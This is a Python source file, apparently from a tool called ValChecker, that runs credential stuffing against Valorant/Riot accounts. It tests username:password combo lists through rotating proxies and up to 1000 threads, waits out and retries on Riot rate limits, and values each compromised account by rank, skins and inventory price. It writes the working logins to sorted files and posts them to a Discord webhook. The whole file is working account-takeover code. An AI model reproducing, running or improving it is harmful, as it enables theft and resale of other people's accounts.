import asyncio
import concurrent
import ctypes
import datetime
import os
import threading
import time
import traceback
from datetime import datetime
from os.path import exists

from colorama import Fore
from InquirerPy.separator import Separator

from codeparts import auth, checkers, staff, systems

check = checkers.checkers()
sys = systems.system()
stff = staff.staff()


class simplechecker():
    def __init__(self, settings: list, proxylist:list, version:str) -> None:
        path = os.getcwd()
        self.version = version
        self.parentpath = os.path.abspath(os.path.join(path, os.pardir))
        self.proxylist = proxylist
        self.inrlimit = 0
        self.max_rlimits = settings['max_rlimits']
        self.rlimit_wait = settings['rlimit_wait']
        self.cooldown = int(settings['cooldown'])
        self.webhook = settings['webhook'].replace(' ', '')
        self.print_sys = bool(settings['print_sys'])
        self.esttime = 'N/A'
        self.newfolder = settings['new_folder']
        if self.newfolder == 'True':
            dtnw = str(datetime.now()).replace(' ', '_').replace(':', '.')
            self.outpath = self.parentpath+f'\\output\\{dtnw}'
            os.mkdir(self.outpath)
        else:
            self.outpath = self.parentpath+'\\output'

        wh_settings = str(settings['dw_settings'])
        self.send_tempban = False
        self.send_woskins = False
        self.send_wfshorty = False
        self.send_stats = False
        self.send_ukreg = False
        # input(wh_settings)
        if 'tempbanned accounts' in wh_settings:
            self.send_tempban = True
        if 'accounts without skins' in wh_settings:
            self.send_woskins = True
        if 'accounts with only wayfinder shorty':
            self.send_wfshorty = True
        if 'stats (once per minute)' in wh_settings:
            self.send_stats = True
        if 'accounts with unknown region' in wh_settings:
            self.send_ukreg = True
        # print(self.send_stats,self.send_tempban,self.send_ukreg,self.send_wfshorty,self.send_woskins)

        # input()

        try:
            import discord_webhook
        except ModuleNotFoundError:
            if self.webhook != '':
                print('"pip install discord_webhook" to use your webhook')
                input('press enter to continue without using the webhook')
                self.webhook = ''
            else:
                pass

        self.cpm = 0
        self.startedcount = 0
        self.cpmtext = self.cpm

        self.checked = 0
        self.valid = 0
        self.banned = 0
        self.tempbanned = 0
        self.skins = 0
        self.unverifiedmail = 0
        self.err = 0
        self.retries = 0
        self.rlimits = 0
        self.riotlimitinarow = 0
        self.count = 0

        self.proxycount = len(proxylist) if self.proxylist != None else 0

        self.run = True

        self.ranks = {'unranked': 0, 'iron': 0, 'bronze': 0, 'silver': 0, 'gold': 0, 'platinum': 0, 'diamond': 0,
                      'ascendant': 0, 'immortal': 0, 'radiant': 0, 'unknown': 0}
        self.skinsam = {'1-10': 0, '10-20': 0,
                        '20-35': 0, '35-40': 0, '40-70': 0, '70+': 0}
        self.locked = 0

        self.regions = {'eu': 0, 'na': 0, 'ap': 0,
                        'br': 0, 'kr': 0, 'latam': 0, 'unknown': 0}

    async def main(self, accounts, count):
        if self.webhook == '':
            self.whtext = f"{Fore.LIGHTRED_EX}Not using a webhook{Fore.RESET}"
        else:
            self.whtext = f'{Fore.LIGHTGREEN_EX}Using the webhook{Fore.RESET}'
        self.count = count
        os.system(f'mode con: cols=150 lines=32')
        self.threadam = int(input(
            f'input number if threads (min 1 max 1000) (proxies: {self.proxycount}) >>>'))
        self.threadam = self.threadam if 1000 > self.threadam > 0 else self.proxycount if self.proxycount > 1 else 3
        menu_choices = [
            Separator(),
            'GUI',
            'LOG (works better with threads)'
        ]
        res = menu_choices[1]
        self.uselog = True if res == menu_choices[2] else False
        num = 0
        self.startedtesting = sys.getmillis()
        self.whtime = sys.getmillis()
        if self.uselog == False:
            self.printinfo()
        if self.threadam <= 1:
            for account in accounts:
                if ':' not in account:
                    self.checked += 1
                    continue
                us = account.split(':')[0]
                ps = account.split(':')[1]
                self.checker(us, ps)
        else:

            loop = asyncio.get_running_loop()
            tasks = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                num = 0
                while num < len(accounts):
                    while len(tasks) >= self.threadam:
                        tasks = [task for task in tasks if not task.done()]
                        await asyncio.sleep(0.1)
                    try:
                        us = accounts[num].split(':')[0]
                        ps = accounts[num].split(':')[1]
                        task = loop.run_in_executor(executor, self.checker, us, ps)
                        tasks.append(task)
                        #print(f'Added task for account {us}:{ps}. Current tasks: {len(tasks)}')
                        num += 1
                    except:
                        print("Checked all")

                while len(tasks) > 0:
                   tasks = [task for task in tasks if not task.done()]
                   await asyncio.sleep(0.1)
                   # print(f'Waiting for {len(tasks)} tasks to complete...')

            # while True:
            #     if threading.active_count() <= self.threadam:
            #         if len(accounts) > num:
            #             try:
            #                 us = accounts[num].split(':')[0]
            #                 ps = accounts[num].split(':')[1]
            #
            #                 threading.Thread(target=self.checker,
            #                                  args=(us, ps)).start()
            #                 # self.printinfo()
            #                 num += 1
            #             except:
            #                 print("Checked all")

    def checker(self, username, password):
        #print('running')
        riotlimitinarow = 0
        proxy = sys.getproxy(self.proxylist)
        acc = f'{username}:{password}'
        space = " "
        authenticate = auth.auth()
        while True:
            try:
                account = authenticate.auth(
                    acc, proxy=proxy)
                if account.banuntil != None:
                    stff.checkban(account)
                if account.code == 2:
                    with open(f'{self.parentpath}/log.txt', 'a') as f:
                        f.write(
                            f'({datetime.now()}) {account.errmsg}\n_________________________________\n')
                    self.err += 1
                elif account.code == 1:
                    if riotlimitinarow < self.max_rlimits:
                        if riotlimitinarow == 0:
                            self.inrlimit += 1
                            print(sys.center(
                                f'riot limit. waiting {self.rlimit_wait} seconds'))
                        time.sleep(self.rlimit_wait)
                        riotlimitinarow += 1
                        continue
                    else:
                        # if self.print_sys==True:
                        print(sys.center(
                            f'{self.max_rlimits} riot limits in a row. skipping'))
                        self.inrlimit -= 1
                        riotlimitinarow = 0
                        self.rlimits += 1
                        self.checked += 1
                        self.printinfo()
                        with open(f'{self.parentpath}/output/riot_limits.txt', 'a', encoding='UTF-8') as file:
                            file.write(f'\n{account.logpass}')
                        break
                elif account.code == 6:
                    proxy = sys.getproxy(self.proxylist)
                    self.retries += 1
                    time.sleep(1)
                    continue
                elif account.code == 3:
                    self.checked += 1
                    self.printinfo()
                    break
                elif account.code == 0:
                    self.checked += 1
                    self.printinfo()
                    break
                elif account.code == 4:
                    self.banned += 1
                    self.checked += 1
                    self.printinfo()
                    time.sleep(self.cooldown)
                    break
                elif account.code == 5:
                    self.retries += 1
                    time.sleep(1)
                    continue
                else:
                    if account.unverifiedmail and account.banuntil is None:
                        self.unverifiedmail += 1
                    while True:
                        sys.get_region2(account, proxy)
                        if account.region != 'N/A' and account.region != '':
                            if account.banuntil is None:
                                self.regions[account.region.lower().strip()] += 1
                            account.rank = None
                            try:
                                if int(account.lvl) < 20 and account.banuntil is None:
                                    self.locked += 1
                                    account.rank = 'locked'
                            except ValueError:
                                pass
                            if account.rank is None:
                                check.ranked(account)
                            if account.banuntil is None:
                                try:
                                    self.ranks[account.rank.strip().lower().split(' ')[0]] += 1
                                except:
                                    self.ranks['unknown'] += 1
                                    
                            check.skins_en(account)
                            check.nightshop_en(account)
                            
                            # get inv price
                            invprice = 0
                            for skin in account.skins.split('\n'):
                                invprice += check.skinprice(skin)
                            check.balance(account)
                            skinscount = len(account.skins.split('\n'))
                            skinscount -= 1
                            if skinscount > 0 and account.banuntil == None:
                                self.skins += 1
                                if skinscount > 70:
                                    self.skinsam['70+'] += 1
                                elif skinscount > 40:
                                    self.skinsam['40-70'] += 1
                                elif skinscount > 35:
                                    self.skinsam['35-40'] += 1
                                elif skinscount > 20:
                                    self.skinsam['20-35'] += 1
                                elif skinscount > 10:
                                    self.skinsam['10-20'] += 1
                                else:
                                    self.skinsam['1-10'] += 1
                            check.lastplayed(account)
                            break
                        else:
                            account.vp, account.rp = 'N/A', 'N/A'
                            account.lastplayed = 'N/A'
                            if account.banuntil == None:
                                self.ranks['unknown'] += 1
                                self.regions['unknown'] += 1
                            account.rank = 'N/A'
                            skinscount = 'N/A'
                            account.skins = 'N/A\n'
                            account.region = 'N/A'
                        break
                        
                    skinsformatted = '\n'.join(account.skins.split('\n'))
                    # NightShopSkinFormatted = '\n'.join(account.NightShop.split('\n'))
                    banuntil = account.banuntil
                    unverifmail = account.unverifiedmail
                    lvl = account.lvl
                    reg = account.region
                    country = account.country
                    rank = account.rank
                    sysrank = rank.strip().lower().split(' ')[0]
                    lastplayed = account.lastplayed
                    vp = account.vp
                    rp = account.rp

                    if account.banuntil != None:
                        self.tempbanned += 1
                        with open(f'{self.outpath}/tempbanned.txt', 'a', encoding='UTF-8') as file:
                            file.write(f'''
╔═════════════════════════════════════════════════════════════╗
║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
║ Ban Until: {banuntil}{space*(61-len(f'Ban Until: {banuntil}'))}║
║                                                             ║
║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
║             Inventory Price = {invprice} VP{space*(61-len(f'             Inventory Price = {invprice} VP'))}║
╠═════════════════════════════════════════════════════════════╣
{skinsformatted}
╚═════════════════════════════════════════════════════════════╝
''')
                    else:
                        # with open(f'{self.parentpath}/output/valid.json','r+',encoding='utf-8') as f:
                        #    data=json.load(f)
                        #    temp=data['valid']
                        #    toadd={'LogPass':account,'region':reg,'rank':rank,'level':lvl,'lastmatch':lastplayed,'unverifiedmail':unverifmail,'vp':vp,'rp':rp,'skinscount':skinscount,f'skins':skins.strip('\n').split('\n')}
                        #    temp.append(toadd)
                        #    f.seek(0)
                        #    json.dump(data, f, indent=4)
                        #    f.truncate()
                        with open(f'{self.outpath}/valid.txt', 'a', encoding='UTF-8') as file:
                            file.write(f'''
╔═════════════════════════════════════════════════════════════╗
║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
║                                                             ║
║                                                             ║
║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
║             Inventory Price = {invprice} VP{space*(61-len(f'             Inventory Price = {invprice} VP'))}║
╠═════════════════════════════════════════════════════════════╣
{skinsformatted}
╚═════════════════════════════════════════════════════════════╝
''')
                    # sort
                    if banuntil == None:
                        self.valid += 1
                    bantext = ''
                    if rank != 'N/A' and reg != 'N/A':
                        if banuntil != None:
                            bantext = f'\n|ban until------> {banuntil}'
                        if not exists(f'{self.outpath}/regions/'):
                            os.mkdir(f'{self.outpath}/regions/')
                        if not exists(f'{self.outpath}/regions/{reg}/'):
                            os.mkdir(f'{self.outpath}/regions/{reg}/')
                        with open(f'{self.outpath}/regions/{reg}/{sysrank}.txt', 'a', encoding='UTF-8') as file:
                            file.write(f'''
╔═════════════════════════════════════════════════════════════╗
║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
║ {bantext}{space*(60-len(bantext))}║
║                                                             ║
║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
║             Inventory Price = {invprice} VP{space*(61-len(f'             Inventory Price = {invprice} VP'))}║
╠═════════════════════════════════════════════════════════════╣
{skinsformatted}
╚═════════════════════════════════════════════════════════════╝
''')
                    if skinscount > 0 and reg != 'N/A' and banuntil == None:
                        if not exists(f'{self.outpath}/skins/'):
                            os.mkdir(f'{self.outpath}/skins/')
                        if skinscount > 70:
                            path = f'{self.outpath}/skins/70+/'
                        elif skinscount > 40:
                            path = f'{self.outpath}/skins/40-70/'
                        elif skinscount > 35:
                            path = f'{self.outpath}/skins/35-40/'
                        elif skinscount > 20:
                            path = f'{self.outpath}/skins/20-35/'
                        elif skinscount > 10:
                            path = f'{self.outpath}/skins/10-20/'
                        else:
                            path = f'{self.outpath}/skins/1-10/'
                        if not exists(path):
                            os.mkdir(path)
                        with open(f'{path}/{reg}.txt', 'a', encoding='UTF-8') as file:
                            file.write(f'''
╔═════════════════════════════════════════════════════════════╗
║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
║                                                             ║
║                                                             ║
║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
║             Inventory Price = {invprice} VP{space*(61-len(f'             Inventory Price = {invprice} VP'))}║
╠═════════════════════════════════════════════════════════════╣
{skinsformatted}
╚═════════════════════════════════════════════════════════════╝
''')
                    if self.webhook != '':
                        send_wh = True
                        if reg == 'N/A' and not self.send_ukreg:
                            send_wh = False

                        if skinscount == 1 and 'Wayfinder Shorty' in account.skins and not self.send_wfshorty:
                            send_wh = False

                        if banuntil != None and not self.send_tempban:
                            send_wh = False

                        if skinscount == 0 and not self.send_woskins:
                            send_wh = False

                        if send_wh == True:
                            from discord_webhook import (DiscordEmbed,
                                                         DiscordWebhook)
                            dcwebhook = DiscordWebhook(url=self.webhook)
                            embed = DiscordEmbed(
                                title='New valid account', color='34eb43')
                            if banuntil != None:
                                embed = DiscordEmbed(
                                    title='New tempbanned account', color='ff4400')
                                embed.add_embed_field(
                                    name='Ban Until', value=str(banuntil))
                            embed.set_author(name='ValChecker')
                            embed.set_timestamp()
                            embed.add_embed_field(
                                name='LogPass', value=account.logpass)
                            embed.add_embed_field(
                                name='Region', value=f'{reg} ({country})')
                            embed.add_embed_field(name='Rank', value=rank)
                            embed.add_embed_field(name='Level', value=lvl)
                            embed.add_embed_field(
                                name='Lastmatch', value=lastplayed)
                            embed.add_embed_field(
                                name='Full Access', value=unverifmail)
                            embed.add_embed_field(
                                name=f'VP / RP', value=f'{vp} / {rp}')
                            embed.add_embed_field(name=f'Skins ({skinscount}) ≈ {invprice} VP', value=account.skins if account.skins.strip(
                            ) != '' else 'no skins')
                            embed.add_embed_field(name=f'NightShop', value=account.NightShop if account.NightShop.strip(
                            ) != '' else 'N/A')
                            dcwebhook.add_embed(embed)
                            response = dcwebhook.execute()
                            # input(response)

            except Exception as e:
                with open(f'{self.parentpath}/log.txt', 'a', errors='replace', encoding='utf-8') as f:
                    f.write(
                        f'({datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
                self.err += 1
            self.checked += 1
            if riotlimitinarow > 0:
                self.inrlimit -= 1
            riotlimitinarow = 0
            if self.uselog == False:
                self.printinfo()
            else:
                pass
            time.sleep(self.cooldown)
            break

    def printinfo(self):
        # get cpm
        finishedtesting = sys.getmillis()
        self.whtime = sys.getmillis()
        if finishedtesting-self.startedtesting > 60000:

            prevcpm = self.cpm
            self.cpm = self.checked-self.startedcount
            self.startedtesting = sys.getmillis()
            self.startedcount = self.checked
            self.cpmtext = f'↑ {self.cpm}' if self.cpm > prevcpm else f'↓ {self.cpm}'
            if self.cpm > 0:
                self.esttime = sys.convert_to_preferred_format(
                    round((self.count-self.checked)/self.cpm*60))
            else:
                self.esttime = 'N/A'

        if self.webhook != '' and self.send_stats and finishedtesting-self.whtime > 300000:
            from discord_webhook import DiscordEmbed, DiscordWebhook
            dcwebhook = DiscordWebhook(url=self.webhook)
            embed = DiscordEmbed(title='Stats', color='686d75')
            embed.set_author(name='ValChecker')
            embed.set_timestamp()
            embed.add_embed_field(
                name='Checked', value=f'{self.checked}/{self.count}')
            embed.add_embed_field(name='Valid', value=self.valid)
            embed.add_embed_field(name='Banned', value=self.banned)
            embed.add_embed_field(name='TempBanned', value=self.tempbanned)
            embed.add_embed_field(name='RLimits', value=self.rlimits)
            embed.add_embed_field(name='With Skins', value=self.skins)
            embed.add_embed_field(
                name='Unverifiedmail', value=self.unverifiedmail)
            embed.add_embed_field(name='CPM', value=self.cpmtext)
            embed.add_embed_field(
                name='Est. Time Remaining', value=self.esttime)
            dcwebhook.add_embed(embed)
            response = dcwebhook.execute()
            self.whtime = sys.getmillis()

        reset = Fore.RESET
        cyan = Fore.CYAN
        green = Fore.LIGHTGREEN_EX
        red = Fore.LIGHTRED_EX
        space = " "
        percent = self.valid/self.checked*100 if self.checked != 0 else 0.0
        percent = f'{str(round(percent,1))}%'
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'ValChecker {self.version}  |  Checked {self.checked}/{self.count}  |  {self.cpmtext} CPM  |  Hitrate {percent}  |  Est. time: {self.esttime}')
        os.system('cls')
        print(f'''
    {reset}
    {sys.center('https://github.com/LIL-JABA/valchecker')}

    {sys.center(f'Proxies: {cyan}{self.proxycount}{reset} | Threads:  {cyan}{self.threadam}{reset} | Accounts: {cyan}{self.count}{reset} | Checked {Fore.YELLOW}{self.checked}{reset}/{Fore.YELLOW}{self.count}{reset} | {self.whtext}')}
                {sys.progressbar(self.checked,self.count)}
    {reset}
{cyan} ┏━ Main ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┏━━ Regions ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┏━━ Skins ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
{cyan} ┃ [{reset}>{cyan}] {reset}Valid          >>:{cyan}[{green}{self.valid}{cyan}] ({percent}){space * (9 - len(str(self.valid))-len(percent))}┃ ┃ [{reset}>{cyan}] {reset}EU            >>:{cyan}[{green}{self.regions['eu']}{cyan}]{space * (18 - len(str(self.regions['eu'])))}┃ ┃ [{reset}>{cyan}] {reset}1-10            >>:{cyan}[{green}{self.skinsam['1-10']}{cyan}]{space * (29 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Banned         >>:{cyan}[{red}{self.banned}{cyan}]{space * (12 - len(str(self.banned)))}┃ ┃ [{reset}>{cyan}] {reset}NA            >>:{cyan}[{green}{self.regions['na']}{cyan}]{space * (18 - len(str(self.regions['na'])))}┃ ┃ [{reset}>{cyan}] {reset}10-20           >>:{cyan}[{green}{self.skinsam['10-20']}{cyan}]{space * (29 - len(str(self.skinsam['10-20'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}TempBanned     >>:{cyan}[{Fore.YELLOW}{self.tempbanned}{cyan}]{space * (12 - len(str(self.tempbanned)))}┃ ┃ [{reset}>{cyan}] {reset}AP            >>:{cyan}[{green}{self.regions['ap']}{cyan}]{space * (18 - len(str(self.regions['ap'])))}┃ ┃ [{reset}>{cyan}] {reset}20-35           >>:{cyan}[{green}{self.skinsam['20-35']}{cyan}]{space * (29 - len(str(self.skinsam['20-35'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Riot Limits    >>:{cyan}[{red}{self.rlimits}{cyan}]{space * (12 - len(str(self.rlimits)))}┃ ┃ [{reset}>{cyan}] {reset}BR            >>:{cyan}[{green}{self.regions['br']}{cyan}]{space * (18 - len(str(self.regions['br'])))}┃ ┃ [{reset}>{cyan}] {reset}35-40           >>:{cyan}[{green}{self.skinsam['35-40']}{cyan}]{space * (29 - len(str(self.skinsam['35-40'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Errors         >>:{cyan}[{red}{self.err}{cyan}]{space * (12 - len(str(self.err)))}┃ ┃ [{reset}>{cyan}] {reset}KR            >>:{cyan}[{green}{self.regions['kr']}{cyan}]{space * (18 - len(str(self.regions['kr'])))}┃ ┃ [{reset}>{cyan}] {reset}40-70           >>:{cyan}[{green}{self.skinsam['40-70']}{cyan}]{space * (29 - len(str(self.skinsam['40-70'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Retries        >>:{cyan}[{Fore.YELLOW}{self.retries}{cyan}]{space * (12 - len(str(self.retries)))}┃ ┃ [{reset}>{cyan}] {reset}LATAM         >>:{cyan}[{green}{self.regions['latam']}{cyan}]{space * (18 - len(str(self.regions['latam'])))}┃ ┃ [{reset}>{cyan}] {reset}70+             >>:{cyan}[{green}{self.skinsam['70+']}{cyan}]{space * (29 - len(str(self.skinsam['70+'])))}┃
{cyan} ┃                                     ┃ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┏━━ Ranks ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┏━ Not main ━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ [{reset}>{cyan}] {reset}Unranked      >>:{cyan}[{green}{self.ranks['unranked']}{cyan}]{space * (18 - len(str(self.ranks['unranked'])))}┃ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}With Skins       >>:{cyan}[{green}{self.skins}{cyan}]{space * (10 - len(str(self.skins)))}┃ ┃ [{reset}>{cyan}] {reset}Iron          >>:{cyan}[{green}{self.ranks['iron']}{cyan}]{space * (18 - len(str(self.ranks['iron'])))}┃ ┃                                                       ┃
{cyan} ┃ [{reset}>{cyan}] {reset}Unverified Mail  >>:{cyan}[{green}{self.unverifiedmail}{cyan}]{space * (10 - len(str(self.unverifiedmail)))}┃ ┃ [{reset}>{cyan}] {reset}Bronze        >>:{cyan}[{green}{self.ranks['bronze']}{cyan}]{space * (18 - len(str(self.ranks['bronze'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Silver        >>:{cyan}[{green}{self.ranks['silver']}{cyan}]{space * (18 - len(str(self.ranks['silver'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Gold          >>:{cyan}[{green}{self.ranks['gold']}{cyan}]{space * (18 - len(str(self.ranks['gold'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Platinum      >>:{cyan}[{green}{self.ranks['platinum']}{cyan}]{space * (18 - len(str(self.ranks['platinum'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Diamond       >>:{cyan}[{green}{self.ranks['diamond']}{cyan}]{space * (18 - len(str(self.ranks['diamond'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Ascendant     >>:{cyan}[{green}{self.ranks['ascendant']}{cyan}]{space * (18 - len(str(self.ranks['ascendant'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Immortal      >>:{cyan}[{green}{self.ranks['immortal']}{cyan}]{space * (18 - len(str(self.ranks['immortal'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Radiant       >>:{cyan}[{green}{self.ranks['radiant']}{cyan}]{space * (18 - len(str(self.ranks['radiant'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Locked        >>:{cyan}[{green}{self.locked}{cyan}]{space * (18 - len(str(self.locked)))}┃ ┃                                                       ┃
{cyan} ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
{Fore.LIGHTCYAN_EX} Estimated remaining time: {self.esttime}{reset}

        ''')
